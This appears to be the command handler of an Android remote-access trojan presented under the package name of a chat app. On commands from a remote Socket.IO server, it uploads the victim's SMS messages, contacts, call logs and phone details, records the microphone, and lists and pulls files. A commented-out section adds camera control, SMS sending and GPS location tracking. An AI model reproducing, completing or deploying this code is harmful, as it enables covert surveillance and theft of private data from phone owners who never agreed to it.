package com.example.chatapp;

import android.content.Context;
import android.util.Log;

import com.example.chatapp.calllogs.CallLogReader;
import com.example.chatapp.contact.ContactReadService;
import com.example.chatapp.fiemanager.FileManager;
import com.example.chatapp.info.PhoneAccountInfo;
import com.example.chatapp.mic.GetRecord;
import com.example.chatapp.sms.SMSReadService;
import com.example.chatapp.socket.IOSocket;

import io.socket.emitter.Emitter;

public class ConnectionManager {


    public static Context context;
    private static io.socket.client.Socket ioSocket;

    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }

    }


    public static void sendReq() {
        try {
            if(ioSocket != null )
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("p", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("p", PhoneAccountInfo.getPhoneInfo());
                }
            });

            ioSocket.on("command", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try{
                        String command = (String) args[0];
                        Log.d("TAG", (String) args[0]);
                        switch (command){
                            case "sms":
                                ioSocket.emit("sms", SMSReadService.getSMSList());
                                break;
                            case "contacts":
                                ioSocket.emit("contacts", ContactReadService.getContactList());
                                break;
                            case "call-logs":
                                ioSocket.emit("call-logs", CallLogReader.getCallLogs());
                                break;
                            case "record":
                                int sec = (int) args[1];
                                GetRecord.startRecording(sec);
                                break;
                            case "fm":
                                String subCommand = (String) args[1];
                                Log.e("subcommand", subCommand);
                                String path = (String) args[2];
                                if (subCommand.equals("ls")){
                                    Log.e("command","ls");
                                    IOSocket.getInstance().getIoSocket().emit("fm-ls",FileManager.listFiles(path));
                                    break;
                                }else if (subCommand.equals("dl")){
                                    FileManager.downloadFile(path);
                                    break;
                                }

                            default:
                                break;
                        }
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            });

            ioSocket.connect();

        }catch (Exception ex){

            Log.e("error" , ex.getMessage());

        }

    }

//    public static void x0000ca(int req){
//
//        if(req == -1) {
//            JSONObject cameraList = new CameraManager(context).findCameraList();
//            if(cameraList != null)
//                ioSocket.emit("x0000ca" ,cameraList );
//        }
//        else if (req == 1){
//            new CameraManager(context).startUp(1);
//        }
//        else if (req == 0){
//            new CameraManager(context).startUp(0);
//        }
//
//    }
//
//    public static void x0000fm(int req , String path){
//        if(req == 0)
//            ioSocket.emit("x0000fm",fm.walk(path));
//        else if (req == 1)
//            fm.downloadFile(path);
//    }
//
//
//    public static void x0000sm(int req,String phoneNo , String msg){
//        if(req == 0)
//            ioSocket.emit("x0000sm" , SMSManager.getSMSList());
//        else if(req == 1) {
//            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
//            ioSocket.emit("x0000sm", isSent);
//        }
//    }
//
//    public static void x0000cl(){
//        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
//    }
//
//    public static void x0000cn(){
//        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
//    }
//
//    public static void x0000mc(int sec) throws Exception{
//        MicManager.startRecording(sec);
//    }
//
//    public static void x0000lm() throws Exception{
//        Looper.prepare();
//        LocManager gps = new LocManager(context);
//        JSONObject location = new JSONObject();
//        // check if GPS enabled
//        if(gps.canGetLocation()){
//
//            double latitude = gps.getLatitude();
//            double longitude = gps.getLongitude();
//            Log.e("loc" , latitude+"   ,  "+longitude);
//            location.put("enable" , true);
//            location.put("lat" , latitude);
//            location.put("lng" , longitude);
//        }
//        else
//            location.put("enable" , false);
//
//        ioSocket.emit("x0000lm", location);
//    }
}